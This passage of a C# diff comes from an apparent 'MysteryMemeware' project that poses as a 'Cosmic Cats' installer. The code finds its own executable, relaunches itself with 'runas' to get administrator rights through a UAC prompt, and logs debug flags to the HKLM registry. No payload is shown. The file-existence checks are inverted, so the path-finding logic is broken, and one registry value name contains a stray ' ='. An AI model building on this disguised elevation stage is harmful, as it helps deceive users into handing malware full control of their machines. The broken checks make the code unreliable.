+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
                 catch
                 {
 
                 }
-
-                if (System.IO.File.Exists(potentialCurrentExecutablePath))
-                {
-                    currentExecutablePath = potentialCurrentExecutablePath;
-                }
-                else
-                {
-                    throw null;
-                }
+                #endregion
             }
-            catch
+            #endregion
+            #region LocateExe
+            string currentExecutablePath = null;
             {
+                #region DebugFlags
+                bool debugFlag_LocateExe_A = false;
+                bool debugFlag_LocateExe_A_0 = false;
+                bool debugFlag_LocateExe_A_1 = false;
+
+                bool debugFlag_LocateExe_B = false;
+                bool debugFlag_LocateExe_B_0 = false;
+                bool debugFlag_LocateExe_B_1 = false;
+                #endregion
                 try
                 {
-                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-
+                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
                     try
                     {
                         potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                     }
                     catch
                     {
-
+                        debugFlag_LocateExe_A_0 = true;
                     }
-
                     if (System.IO.File.Exists(potentialCurrentExecutablePath))
                     {
-                        currentExecutablePath = potentialCurrentExecutablePath;
-                    }
-                    else
-                    {
+                        debugFlag_LocateExe_A_1 = true;
                         throw null;
                     }
+                    currentExecutablePath = potentialCurrentExecutablePath;
                 }
                 catch
                 {
-
-                }
-            }
-
-            #endregion
-
-            #region Restart As Admin
-
-            try
-            {
-                if (currentExecutablePath is null)
-                {
-                    throw null;
-                }
-
-                System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                adminRestartStartInfo.Arguments = "";
-                adminRestartStartInfo.CreateNoWindow = false;
-                adminRestartStartInfo.Domain = null;
-                adminRestartStartInfo.ErrorDialog = false;
-                adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-                adminRestartStartInfo.FileName = currentExecutablePath;
-                adminRestartStartInfo.LoadUserProfile = false;
-                adminRestartStartInfo.Password = null;
-                adminRestartStartInfo.PasswordInClearText = null;
-                adminRestartStartInfo.RedirectStandardError = false;
-                adminRestartStartInfo.RedirectStandardInput = false;
-                adminRestartStartInfo.RedirectStandardOutput = false;
-                adminRestartStartInfo.StandardErrorEncoding = null;
-                adminRestartStartInfo.StandardOutputEncoding = null;
-                adminRestartStartInfo.UserName = null;
-                adminRestartStartInfo.UseShellExecute = true;
-                adminRestartStartInfo.Verb = "runas";
-                adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
-
-                try
-                {
-                    adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
-
-                    //adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
-                }
-                catch
-                {
+                    debugFlag_LocateExe_A = true;
                     try
                     {
-                        adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
-                    }
-                    catch
-                    {
+                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                         try
                         {
-                            adminRestartStartInfo.WorkingDirectory = null;
+                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                         }
                         catch
                         {
+                            debugFlag_LocateExe_B_0 = true;
+                        }
+                        if (System.IO.File.Exists(potentialCurrentExecutablePath))
+                        {
+                            debugFlag_LocateExe_B_1 = true;
+                            throw null;
+                        }
+                        currentExecutablePath = potentialCurrentExecutablePath;
+                    }
+                    catch
+                    {
+                        debugFlag_LocateExe_B = true;
+                    }
+                }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
+                }
+                catch
+                {
 
+                }
+                #endregion
+            }
+            #endregion
+            #region UserElevate
+            {
+                #region DebugFlags
+                bool debugFlag_UserElevate_A = false;
+                bool debugFlag_UserElevate_A_0 = false;
+                bool debugFlag_UserElevate_A_1 = false;
+                bool debugFlag_UserElevate_A_2 = false;
+                bool debugFlag_UserElevate_A_3 = false;
+                bool debugFlag_UserElevate_A_4 = false;
+                bool debugFlag_UserElevate_A_5 = false;
+                bool debugFlag_UserElevate_A_6 = false;
+                #endregion
+                try
+                {
+                    if (currentExecutablePath is null)
+                    {
+                        debugFlag_UserElevate_A_0 = true;
+                        throw null;
+                    }
+                    System.Diagnostics.ProcessStartInfo userElevateStartInfo = new System.Diagnostics.ProcessStartInfo();
+                    userElevateStartInfo.Arguments = "";
+                    userElevateStartInfo.CreateNoWindow = false;
+                    userElevateStartInfo.Domain = null;
+                    userElevateStartInfo.ErrorDialog = false;
+                    userElevateStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+                    userElevateStartInfo.FileName = currentExecutablePath;
+                    userElevateStartInfo.LoadUserProfile = false;
+                    userElevateStartInfo.Password = null;
+                    userElevateStartInfo.PasswordInClearText = null;
+                    userElevateStartInfo.RedirectStandardError = false;
+                    userElevateStartInfo.RedirectStandardInput = false;
+                    userElevateStartInfo.RedirectStandardOutput = false;
+                    userElevateStartInfo.StandardErrorEncoding = null;
+                    userElevateStartInfo.StandardOutputEncoding = null;
+                    userElevateStartInfo.UserName = null;
+                    userElevateStartInfo.UseShellExecute = true;
+                    userElevateStartInfo.Verb = "runas";
+                    userElevateStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
+                    try
+                    {
+                        userElevateStartInfo.WorkingDirectory = (new System.IO.FileInfo(currentExecutablePath)).DirectoryName;
+                    }
+                    catch
+                    {
+                        debugFlag_UserElevate_A_1 = true;
+                        try
+                        {
+                            userElevateStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
+                        }
+                        catch
+                        {
+                            debugFlag_UserElevate_A_2 = true;
+                            try
+                            {
+                                userElevateStartInfo.WorkingDirectory = null;
+                            }
+                            catch
+                            {
+                                debugFlag_UserElevate_A_3 = true;
+                            }
+                        }
+                    }
+                    try
+                    {
+                        System.Diagnostics.Process.Start(userElevateStartInfo);
+                    }
+                    catch (System.ComponentModel.Win32Exception ex)
+                    {
+                        if (ex.NativeErrorCode == 1223)
+                        {
+                            debugFlag_UserElevate_A_4 = true;
+                            try
+                            {
+                                System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed. If you would like to install Cosmic Cats later simply run the installer again.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
+                            }
+                            catch
+                            {
+                                debugFlag_UserElevate_A_5 = true;
+                            }
+                        }
+                        else
+                        {
+                            debugFlag_UserElevate_A_6 = true;
+                            throw null;
                         }
                     }
                 }
-
+                catch
+                {
+                    debugFlag_UserElevate_A = true;
+                }
+                #region SaveDebugFlags
                 try
                 {
-                    System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo);
-
-                    System.Diagnostics.Process.Start(adminRestartStartInfo);
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("debugFlag_UserElevate_A =", debugFlag_UserElevate_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_0", debugFlag_UserElevate_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_1", debugFlag_UserElevate_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_2", debugFlag_UserElevate_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_3", debugFlag_UserElevate_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_4", debugFlag_UserElevate_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_5", debugFlag_UserElevate_A_5.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_UserElevate_A_6", debugFlag_UserElevate_A_6.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
-                catch (System.ComponentModel.Win32Exception ex)
+                catch
                 {
-                    if (ex.NativeErrorCode == 1223)
-                    {
-                        System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed. If you would like to install Cosmic Cats later simply run the installer again.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
-                    }
-                    else
-                    {
-                        throw null;
-                    }
+
                 }
+                #endregion
             }
-            catch
-            {
-
-            }
-
             #endregion
         }
 
@@ -961,51 +1054,26 @@
 
             #endregion
 
+            //tag
             #region LocateExe
-
-            #region DebugFlags
-            bool debugFlag_LocateExe = false;
-
-            bool debugFlag_LocateExe_A = false;
-            bool debugFlag_LocateExe_A_0 = false;
-            bool debugFlag_LocateExe_A_1 = false;
-
-            bool debugFlag_LocateExe_B = false;
-            bool debugFlag_LocateExe_B_0 = false;
-            bool debugFlag_LocateExe_B_1 = false;
-            #endregion
 
             string currentExecutablePath = null;
 
-            try
             {
-                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
+
+                #region DebugFlags
+                bool debugFlag_LocateExe_A = false;
+                bool debugFlag_LocateExe_A_0 = false;
+                bool debugFlag_LocateExe_A_1 = false;
+
+                bool debugFlag_LocateExe_B = false;
+                bool debugFlag_LocateExe_B_0 = false;
+                bool debugFlag_LocateExe_B_1 = false;
+                #endregion
 
                 try
                 {
-                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
-                }
-                catch
-                {
-                    debugFlag_LocateExe_A_0 = true;
-                }
-
-                if (System.IO.File.Exists(potentialCurrentExecutablePath))
-                {
-                    debugFlag_LocateExe_A_1 = true;
-
-                    throw null;
-                }
-
-                currentExecutablePath = potentialCurrentExecutablePath;
-            }
-            catch
-            {
-                debugFlag_LocateExe_A = true;
-
-                try
-                {
-                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
 
                     try
                     {
@@ -1013,12 +1081,12 @@
                     }
                     catch
                     {
-                        debugFlag_LocateExe_B_0 = true;
+                        debugFlag_LocateExe_A_0 = true;
                     }
 
                     if (System.IO.File.Exists(potentialCurrentExecutablePath))
                     {
-                        debugFlag_LocateExe_B_1 = true;
+                        debugFlag_LocateExe_A_1 = true;
 
                         throw null;
                     }
@@ -1027,10 +1095,62 @@
                 }
                 catch
                 {
-                    debugFlag_LocateExe_B = true;
+                    debugFlag_LocateExe_A = true;
 
-                    debugFlag_LocateExe = true;
+                    try
+                    {
+                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+
+                        try
+                        {
+                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
+                        }
+                        catch
+                        {
+                            debugFlag_LocateExe_B_0 = true;
+                        }
+
+                        if (System.IO.File.Exists(potentialCurrentExecutablePath))
+                        {
+                            debugFlag_LocateExe_B_1 = true;
+
+                            throw null;
+                        }
+
+                        currentExecutablePath = potentialCurrentExecutablePath;
+                    }
+                    catch
+                    {
+                        debugFlag_LocateExe_B = true;
+                    }
                 }
+
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+
+                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString());
+                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString());
+                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString());
+                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString());
+                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString());
+                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString());
+
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+
+                    localMachine.Close();
+                    localMachine.Dispose();
+                }
+                catch
+                {
+
+                }
+                #endregion
+
             }
 
             #endregion
